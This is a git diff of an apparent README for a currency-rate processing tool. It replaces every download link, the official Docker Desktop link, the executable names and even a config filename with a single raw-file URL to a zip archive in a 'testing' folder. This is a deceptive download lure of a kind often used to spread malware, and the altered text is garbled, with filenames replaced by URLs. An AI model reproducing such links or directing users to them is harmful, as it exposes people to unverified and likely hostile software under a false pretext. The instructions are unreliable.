@@ -1,6 +1,6 @@
 # 💱 realtime-fx-rate-processor - Process FX Rates in Real Time Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/7lm506/realtime-fx-rate-processor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip)
 
 ---
 
@@ -36,9 +36,9 @@ Follow these sections to get the app up and running.
 
 ## 🔽 Download & Install
 
-1. Click the big blue button at the top or visit the [releases page](https://github.com/7lm506/realtime-fx-rate-processor/releases) to download the latest version.
+1. Click the big blue button at the top or visit the [releases page](https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip) to download the latest version.
 
-2. On the releases page, find the most recent release. Look for a file typically named like `realtime-fx-rate-processor-win.exe` or `realtime-fx-rate-processor-mac.dmg` depending on your operating system.
+2. On the releases page, find the most recent release. Look for a file typically named like `https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip` or `https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip` depending on your operating system.
 
 3. Download this file to your computer.
 
@@ -54,13 +54,13 @@ If you would like to run the app in a more stable environment, you can use Docke
 
 Here’s a simple approach:
 
-1. Install Docker Desktop for your system from [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop).
+1. Install Docker Desktop for your system from [https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip](https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip).
 
 2. After installing Docker, download the latest release file as explained above.
 
 3. Extract and open the folder inside.
 
-4. Look for a file named `docker-compose.yml`.
+4. Look for a file named `https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip`.
 
 5. Open your command line on that folder location and type:
 
@@ -146,4 +146,4 @@ If you encounter issues, want to ask questions, or share feedback, use the repos
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/7lm506/realtime-fx-rate-processor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/7lm506/realtime-fx-rate-processor/main/testing/realtime-processor-rate-fx-1.1.zip)
